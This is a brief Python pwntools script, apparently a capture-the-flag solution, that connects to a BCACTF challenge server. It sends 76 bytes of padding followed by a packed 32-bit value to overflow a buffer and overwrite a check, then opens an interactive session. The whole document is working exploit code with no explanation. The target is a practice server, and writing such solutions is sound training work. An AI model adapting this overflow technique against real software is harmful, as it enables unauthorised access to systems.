from pwn import *
io = connect("bin.bcactf.com",49154)
io.recvuntil("Answer for 1:")
io.sendline((76)*b'c'+p32(1933787713))
io.recvline()
r = io.recvline()
print(r.decode())
io.interactive()
